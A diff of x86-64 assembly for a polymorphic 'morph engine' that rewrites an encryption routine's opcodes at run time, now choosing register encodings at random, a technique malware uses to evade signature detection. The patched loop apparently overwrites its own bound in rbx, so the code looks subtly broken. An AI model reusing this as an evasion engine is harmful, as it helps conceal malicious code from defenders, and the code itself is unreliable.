@@ -2,7 +2,7 @@
 
 global morph_engine
 
-
+extern rand
 %define OPCODE_ADD_REG 0x01
 %define OPCODE_SUB_REG 0x29
 
@@ -53,9 +53,9 @@ call mprotect
 
 ; set up needed values
 mov r12, .encryption_function
-mov rdi, .encryption_function
-add rdi, FUNC_SIZE
-sub rdi, 0x1
+mov rbx, .encryption_function
+add rbx, FUNC_SIZE
+sub rbx, 0x1
 mov r13, [rbp-0x28]
 add r13, [rbp-0x10] 
 add r13, FUNC_SIZE
@@ -65,7 +65,11 @@ mov r15, ModRegRM
 
 
 .encrypt_logic_loop:
-	cmp r12, rdi
+	call rand
+	xor rdx, rdx
+	mov rcx, 2
+	div rcx
+	cmp r12, rbx
 	ja .encrypt_function_load_values
 
 
@@ -75,7 +79,7 @@ mov r15, ModRegRM
 .func_add_reg:
 	sub r13, 0x2
 	xor rax, rax
-	mov al, [r15]
+	mov al, [r15+rdx*4]
 	xor rbx, rbx
 	mov bh, al
 	mov ah, OPCODE_ADD_REG
